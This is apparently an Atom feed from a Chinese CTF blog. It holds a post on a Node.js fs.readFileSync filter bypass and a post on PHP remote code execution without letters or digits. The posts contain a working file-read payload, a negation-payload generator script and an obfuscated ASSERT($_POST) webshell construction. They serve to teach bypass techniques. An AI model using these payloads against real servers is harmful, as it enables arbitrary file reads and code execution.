<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M1seryの厨房</title>
  
  
  <link href="https://www.m0x01sery.com/atom.xml" rel="self"/>
  
  <link href="https://www.m0x01sery.com/"/>
  <updated>2022-09-18T16:00:00.000Z</updated>
  <id>https://www.m0x01sery.com/</id>
  
  <author>
    <name>M1sery</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一个fs.readFileSync的trick浅析</title>
    <link href="https://www.m0x01sery.com/2022/09/19/readFileSync/"/>
    <id>https://www.m0x01sery.com/2022/09/19/readFileSync/</id>
    <published>2022-09-18T16:00:00.000Z</published>
    <updated>2022-09-18T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个<code>fs.readFileSync</code>的trick浅析</p><span id="more"></span><p>设想下面一个简单的代码片段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>一个过滤了关键词<strong>flag</strong>的任意文件读取。</p><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;file[href]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[origin]&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[protocol]&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[pathname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;/fl%61g&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;file[hostname]&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>通过下面的源码分析，我们将得知这个trick的精彩之处。</p><p>首先从文档入手，粗略认识一下<code>fs.readFileSync</code>方法</p><p><img src="/images/20220923230858.png"></p><p>我们注意到<code>path</code>参数可以是一个<code>URL</code>对象，payload中的flag关键字似乎也是利用了url解码的方法进行绕过的。但显然我们无法直接输入一个<code>URL</code>对象，难道还有其它方法能构造出<code>URL</code>对象吗？</p><p><img src="/images/20220924233442.png"></p><p>顺着这个思路，我们开始一步步地跟进源码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">readFileSync</span>(<span class="params">path, options</span>) &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">const</span> isUserFd = <span class="title function_">isFd</span>(path); <span class="comment">// 判断是否为文件描述符</span></span><br><span class="line">  <span class="keyword">const</span> fd = isUserFd ? path : fs.<span class="title function_">openSync</span>(path, options.<span class="property">flag</span>, <span class="number">0o666</span>);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>path</code>如果不是文件描述符的话，将调用<code>fs.openSync</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">openSync</span>(<span class="params">path, flags, mode</span>) &#123;</span><br><span class="line">  path = <span class="title function_">getValidatedPath</span>(path);</span><br><span class="line">  <span class="keyword">const</span> flagsNumber = <span class="title function_">stringToFlags</span>(flags);</span><br><span class="line">  mode = <span class="title function_">parseFileMode</span>(mode, <span class="string">&#x27;mode&#x27;</span>, <span class="number">0o666</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ctx = &#123; path &#125;;</span><br><span class="line">  <span class="keyword">const</span> result = binding.<span class="title function_">open</span>(pathModule.<span class="title function_">toNamespacedPath</span>(path),</span><br><span class="line">                              flagsNumber, mode,</span><br><span class="line">                              <span class="literal">undefined</span>, ctx);</span><br><span class="line">  <span class="title function_">handleErrorFromBinding</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>getValidatedPath</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getValidatedPath = <span class="title function_">hideStackFrames</span>(<span class="function">(<span class="params">fileURLOrPath, propName = <span class="string">&#x27;path&#x27;</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> path = <span class="title function_">toPathIfFileURL</span>(fileURLOrPath);</span><br><span class="line">  <span class="title function_">validatePath</span>(path, propName);</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>跟进回调函数中的<code>toPathIfFileURL</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toPathIfFileURL</span>(<span class="params">fileURLOrPath</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(fileURLOrPath))</span><br><span class="line">    <span class="keyword">return</span> fileURLOrPath;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fileURLToPath</span>(fileURLOrPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>isURLInstance</code>的真假判断</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isURLInstance</span> = (<span class="params">input</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> input != <span class="literal">null</span> &amp;&amp; input.<span class="property">href</span> &amp;&amp; input.<span class="property">origin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输入存在<code>href</code>和<code>origin</code>属性将返回真，此时返回<code>fileURLToPath</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fileURLToPath</span>(<span class="params">path</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> path === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">    path = <span class="keyword">new</span> <span class="title function_">URL</span>(path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_">isURLInstance</span>(path))</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_ARG_TYPE</span>(<span class="string">&#x27;path&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;URL&#x27;</span>], path);</span><br><span class="line">  <span class="keyword">if</span> (path.<span class="property">protocol</span> !== <span class="string">&#x27;file:&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_URL_SCHEME</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> isWindows ? <span class="title function_">getPathFromURLWin32</span>(path) : <span class="title function_">getPathFromURLPosix</span>(path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>fileURLToPath</code>函数内部终于出现了<code>new URL</code>，好耶</p><p>第一个<code>if</code>要求参数对象属性必须得是字符串类型才给我们new，好在这个要求无伤大雅。</p><p>此时它要求我们的<code>protocol</code>属性为<code>file:</code>，否则将会抛出一个错误。</p><p>接下来判断运行系统是否为Windows系统，在环境是Linux的情况下，跟进<code>getPathFromURLPosix</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPathFromURLPosix</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">hostname</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_HOST</span>(platform);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> pathname = url.<span class="property">pathname</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; pathname.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pathname[n] === <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> third = pathname.<span class="title function_">codePointAt</span>(n + <span class="number">2</span>) | <span class="number">0x20</span>;</span><br><span class="line">      <span class="keyword">if</span> (pathname[n + <span class="number">1</span>] === <span class="string">&#x27;2&#x27;</span> &amp;&amp; third === <span class="number">102</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_INVALID_FILE_URL_PATH</span>(</span><br><span class="line">          <span class="string">&#x27;must not include encoded / characters&#x27;</span></span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(pathname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输入的<code>hostname</code>属性不为空的话将再次抛出一个错误，因此我们需要构造一个空的<code>hostname</code>属性，好让函数继续进行下去。</p><p>而剩下的代码和<code>decodeURIComponent</code>就是在帮我们以url解码的方式转换<code>pathname</code>属性了。</p><p><img src="/images/20220925001928.png"></p><p>本地验证大成功。</p><p>这个trick真的很有意思，因为它看似简单，但需要深入源码分析才能明白它的原理。 </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个&lt;code&gt;fs.readFileSync&lt;/code&gt;的trick浅析&lt;/p&gt;</summary>
    
    
    
    
    <category term="node.js" scheme="https://www.m0x01sery.com/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字RCE初探</title>
    <link href="https://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/"/>
    <id>https://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/</id>
    <published>2022-03-27T16:00:00.000Z</published>
    <updated>2022-03-31T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>没有blacklist的rce是没有灵魂的！</p><p>有人说，说是有人在blacklist里下了毒（指<code>/[a-zA-Z0-9]+/</code></p><p>害羞羞，你看你就会开玩笑（指绕过</p><span id="more"></span><p>本地写个青春版开冲</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><h1 id="鸡汤来咯"><a href="#鸡汤来咯" class="headerlink" title="鸡汤来咯"></a>鸡汤来咯</h1><h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>按位取反，入坑以来最先接触到的姿势，温故而知新。</p><p>举个栗子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">233</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># int(-234)</span></span><br></pre></td></tr></table></figure><p><code>233</code>的二进制值为<code>0000 0000 1110 1001</code></p><p>按位取反得<code>1111 1111 0001 0110</code>，即<code>-234</code>。</p><p>ps：我们可能更熟悉长成<code>1000 0000 1110 1010</code>的<code>-234</code>，其实它们是等价的，只是表示方法不同。前者是补码形式，后者是原码形式，最高位都为符号位。关于<a href="https://www.cnblogs.com/ydqblogs/p/13823206.html">原码，反码，补码</a></p><p>那么对于字母而言，我们也就能通过其他字符加上取反操作得到我们想到的组合了。</p><p>大部分情况下都会加上<code>urlencode()</code>，出现乱码总是很老火的说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span></span><br></pre></td></tr></table></figure><p>最终payload为<code>(%8F%97%8F%96%91%99%90)();</code>。</p><p>相信不止我一个人在刚接触这种姿势时认为，将<code>phpinfo();</code>这完整的函数进行取反不是能减少一些操作嘛，为什么要单独取反函数名再加上括号和分号呢？</p><p>让我们把这段代码再回下锅</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p><code>eval()</code>首先执行的操作是取反<code>~</code>，而取反后的最终结果只会是单纯的字符串。得出<code>phpinfo</code>后，如果再加上外部的括号，得到的实际上是<code>(&#39;phpinfo&#39;)()</code>，经过<code>eval()</code>的解析，在php7及以上版本中这种写法会被认为是函数，因此会执行后续的payload。分号作为一句完整代码的结束标志，就和平时写代码一样。</p><p>我们将括号分号一齐加入取反的队伍，取反后得到了<code>phpinfo();</code>，看似没有多大差别，但我们要知道，这是一串字符串，只是一串字符串。<code>eval()</code>对单纯的字符串又有什么坏心思呢？于是就没有后续了。（悲</p><p>试着写了个很挫的脚本 学习为主 轻喷（demo版 后面会继续升级的 这还不够智能 瘫</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn($func1 [, $func2] [, $param])</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;ini_get&#x27;</span>, <span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$func1</span>, <span class="variable">$func2</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$param</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$negat_func1</span> = ~<span class="variable">$func1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)());&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$negat_param</span> = ~<span class="variable">$param</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func2</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$negat_func2</span> = ~<span class="variable">$func2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func1</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_func2</span>).<span class="string">&#x27;)((~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$negat_param</span>).<span class="string">&#x27;)));&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>万恶之源 我很异或（疑惑）的出处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">1</span>;  <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span>^<span class="number">0</span>;  <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">0</span>^<span class="number">0</span>;  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>在php中两个字符串异或之后，得到的还是一个字符串。基于此我们也能做到无字母数字构造payload。</p><p>选择异或的理由？同或不行吗？当然可以!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>|<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>; <span class="comment"># c</span></span><br></pre></td></tr></table></figure><p>不过异或运算的一大特点是<strong>运算可逆</strong>，异或字符和被异或字符运算的结果能倒着异或回去得到相同的结果，相对同或来说，这为我们寻找payload提供了莫大的便利。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># @</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>; <span class="comment"># a</span></span><br></pre></td></tr></table></figure><p>（脚本绝赞升级中）</p><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>php的字符自增和C的ASCII值自增有很大不同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># aa</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>; <span class="comment"># ab</span></span><br></pre></td></tr></table></figure><p>同时我们要注意字符变量只能递增，不能递减，且只支持纯字母（a-z 和 A-Z），递增或递减其他字符变量是没有用的哦。</p><p>基于此特性，我们要想获得小写字母，就要从<code>a</code>开始自增，要想获得大写字母，就从<code>A</code>开始。</p><p>同时，在php中如果强制连接数组和字符串，会发生强制类型转换，数组将被转为字符串，且值为<code>Array</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>; <span class="comment"># Array</span></span><br></pre></td></tr></table></figure><p>好巧不巧，这<code>Array</code>里不仅有<code>A</code>还有<code>a</code>，再配合自增，我们就能构造出任意英文字母了。</p><p>自搓脚本 梅开二度（指很拉的构造 太弱小了 没有力量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span> = [].<span class="string">&#x27;&#x27;</span>;          <span class="comment"># $__ = &#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>[<span class="string">&#x27;!&#x27;</span> == <span class="string">&#x27;?&#x27;</span>]; <span class="comment"># $_ = $__[0];</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>;            <span class="comment"># A</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$____</span> = ++<span class="variable">$_</span>;         <span class="comment"># E</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_____</span> = ++<span class="variable">$_</span>;        <span class="comment"># O</span></span><br><span class="line"><span class="variable">$______</span> = ++<span class="variable">$_</span>;       <span class="comment"># P</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_______</span> = ++<span class="variable">$_</span>;      <span class="comment"># R</span></span><br><span class="line"><span class="variable">$________</span> = ++<span class="variable">$_</span>;     <span class="comment"># S</span></span><br><span class="line"><span class="variable">$_________</span> = ++<span class="variable">$_</span>;    <span class="comment"># T</span></span><br><span class="line">++<span class="variable">$_</span>;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$___</span>.<span class="variable">$________</span>.<span class="variable">$________</span>.<span class="variable">$____</span>.<span class="variable">$_______</span>.<span class="variable">$_________</span>)(<span class="string">&#x27;$_&#x27;</span>.<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$________</span>.<span class="variable">$_________</span>.<span class="string">&#x27;[_];&#x27;</span>);</span><br><span class="line"><span class="comment"># (&#x27;ASSERT&#x27;)(&#x27;$_POST[_];&#x27;);</span></span><br></pre></td></tr></table></figure><p>看着熟悉的<code>eval()</code>消失在payload里，心态逐渐发生了一些微妙的变化</p><p>事实上，<code>assert()</code>的构造在php7中和<code>eval()</code>一样，也变成了一种语言结构而不是一个函数，这导致此类payload在php7及以上版本环境中全部无效。</p><p><a href="https://www.anquanke.com/post/id/173201">浅谈eval和assert</a>对此做了一些补充说明。</p><p>真搞事还得是<code>system()</code>啊（确信</p><p>又由于自增类型的payload太长，非常容易被长度限制，因此命令执行还是用取反或者异或叭。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;没有blacklist的rce是没有灵魂的！&lt;/p&gt;
&lt;p&gt;有人说，说是有人在blacklist里下了毒（指&lt;code&gt;/[a-zA-Z0-9]+/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;害羞羞，你看你就会开玩笑（指绕过&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="rce" scheme="https://www.m0x01sery.com/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>域肾透——从看懂到看开 0x00</title>
    <link href="https://www.m0x01sery.com/2022/03/09/computer-networks-basic/"/>
    <id>https://www.m0x01sery.com/2022/03/09/computer-networks-basic/</id>
    <published>2022-03-08T16:00:00.000Z</published>
    <updated>2022-03-15T16:00:00.000Z</updated>
    
